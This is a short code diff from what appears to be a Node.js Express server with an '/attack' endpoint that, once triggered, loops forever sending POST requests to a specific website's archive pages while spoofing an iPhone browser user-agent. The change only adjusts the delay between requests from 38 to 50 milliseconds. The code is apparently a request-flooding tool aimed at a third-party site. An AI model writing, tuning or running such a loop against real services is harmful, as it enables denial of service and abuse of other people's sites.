@@ -19,7 +19,7 @@ app.post('/attack', async (req, res) => {
   let count = 0;
   res.status(200).send("started");
   while ( true ) {
-    await sleep(38);
+    await sleep(50);
     fetch(`https://healthy-person-emulator.org/archives/${id}?_data=routes%2F_layout.archives.%24postId`, {method: "POST", headers: {
         "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
         "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
